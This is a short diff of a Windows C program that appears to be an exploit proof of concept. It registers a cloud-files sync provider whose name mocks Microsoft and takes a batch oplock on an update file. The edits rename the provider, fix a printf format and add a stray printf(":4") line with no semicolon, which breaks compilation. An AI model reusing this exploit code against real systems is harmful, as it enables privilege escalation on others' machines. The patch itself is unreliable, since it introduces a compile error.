@@ -451,7 +451,7 @@ void DoCloudStuff(wchar_t* syncroot, wchar_t* filename, DWORD filesz = 0x1000)
 
     CF_SYNC_REGISTRATION cfreg = { 0 };
     cfreg.StructSize = sizeof(CF_SYNC_REGISTRATION);
-    cfreg.ProviderName = L"SERIOUSLYMSFT"; // let's see how long you can play this game, I'm willing to go as far as you want.
+    cfreg.ProviderName = L"SRSLYMSFT"; // let's see how long you can play this game, I'm willing to go as far as you want.
     cfreg.ProviderVersion = L"1.0";
     CF_SYNC_POLICIES syncpolicy = { 0 };
     syncpolicy.StructSize = sizeof(CF_SYNC_POLICIES);
@@ -671,7 +671,7 @@ int main()
     DeviceIoControl(hfile, FSCTL_REQUEST_BATCH_OPLOCK, NULL, NULL, NULL, NULL, NULL, &ovd);
     if (GetLastError() != ERROR_IO_PENDING)
     {
-        printf("Failed to request a batch oplock on the update file, error : %d", GetLastError());
+        printf("Failed to request a batch oplock on the update file, error: %d", GetLastError());
         return 1;
     }
 
@@ -758,6 +758,7 @@ int main()
         return 1;
     }
     printf("The red sun shall prevail.\n");
+    printf(":4")
     
     CloseHandle(hlk);
     CloseHandle(hrp);
